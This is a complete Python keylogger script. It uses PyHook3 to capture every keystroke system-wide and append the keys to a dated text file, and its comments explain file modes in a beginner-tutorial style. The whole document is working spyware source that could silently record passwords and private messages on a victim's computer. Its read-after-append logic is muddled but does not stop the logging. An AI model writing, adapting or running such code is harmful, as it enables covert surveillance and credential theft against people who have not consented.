import PyHook3
import pythoncom
from datetime import datetime




# Define a new function for the keylogger


def OnKeyboardEvent(event):
  datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
  datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and time the keys were stamped

  '''
  w  write mode
  r  read mode
  a  append mode

  w+  create file if it doesn't exist and open it in write mode
  r+  open an existing file in read+write mode
  a+  create file if it doesn't exist and open it in append mode
  '''

  logfile = open( datelogname + 'logfile.txt', 'a+')   # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
  buffers = logfile.read()  # buffers is set to open the file and read what is  in it.
  logfile.close()  # closes the log file.

  # open the file to write the current new keystrokes.

  logfile = open(datelogname + "logfile.txt", 'a+')  # opens the log
  keylogs = chr(event.Ascii)
  buffers = logfile.read()
  if event.Ascii == 13:
    keylogs = '\n'

  buffers += keylogs



  logfile.write(buffers)


  logfile.close()
  return True


hm = PyHook3.HookManager()


#hook keyboard
hm.KeyDown = OnKeyboardEvent   # watch for all keyboard events
hm.HookKeyboard()

pythoncom.PumpMessages()




